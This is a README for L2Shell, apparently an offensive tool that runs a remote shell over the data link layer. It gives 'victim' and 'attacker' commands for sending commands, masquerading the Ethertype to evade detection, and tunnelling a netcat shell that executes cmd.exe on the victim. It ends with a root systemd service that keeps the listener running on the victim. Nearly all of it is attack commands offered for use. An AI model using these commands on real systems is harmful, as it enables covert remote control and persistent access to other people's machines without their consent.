# L2Shell
L2Shell is an opensource tool used for communications via data link layer.
This script should work for both windows and linux systems.

## L2Shell Usage
```
python l2shell.py -h
```

### On victim machine:
```
python l2shell.py -l -a <attacker_id> -s <session_id>
```

### On Attacker machine
```
python l2shell.py -c -a <attacker_id> -s <session_id>
```

### Sending command (from attacker host)
```
> <command>
```

### enable options (from attacker host)
```
> enable options
```

### Changing framesize (victim)
```
python l2shell.py -l -f <frame_size> -a <attacker_id> -s <session_id>
```

### Changing chunked request delay (victim)
```
python l2shell.py -l -d <delay> -a <attacker_id> -s <session_id>
```

### Connect to Victim via Mac address - Victim responds with broadcasts
```
python l2shell.py -c/-l -m <aa:aa:aa:aa:aa:aa> -a <attacker_id> -s <session_id>
```

### Change interface
```
python l2shell.py -c/-l -a <attacker_id> -s <session_id> -i <interface guid>
```

### setup interface
```
python l2shell.py -c -a <attacker_id> -s <session_id> -si
```

### Ethertype Masquerading 
```
python l2shell.py -c -a <attacker_id> -s <session_id> -et <0x0000-0xFFFF>
python l2shell.py -l -a <attacker_id> -s <session_id> -et <0x0000-0xFFFF>
python l2shell.py -c -a <attacker_id> -s <session_id> -et <0x0000-0xFFFF> -p
```

## L2Tunnel - Tunneling Netcat
### Attacker Machine
```
python l2shell.py -c -a <attacker_id> -s <session_id> -p
```
```
ncat.exe 127.0.0.1 1111 --source-port 2223 -u
```
### Victim Node Machine
```
python l2shell.py -l -a <attacker_id> -s <session_id> -p
```
```
ncat.exe -lvnp 2223 -u -e cmd.exe
```
`note: The proxy option [-p] [--proxy] opens local ports 1111 and 2222`

### Requirements
- pcap
- scapy

`note: commands and readme are temporary for the prototype`

## Linux Persistence via Service
```
/etc/systemd/system
sudo nano l2service.server
```
```
[Unit]
Description=L2Shell Listener Service
After=network.target

[Service]
ExecStart=python3 /tmp/L2Shell-main/l2shell.py -l -a att123 -s sess123
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```
### Now enable the service
```
sudo systemctl daemon-reload
sudo systemctl start l2service.service
sudo systemctl enable l2service.service
```
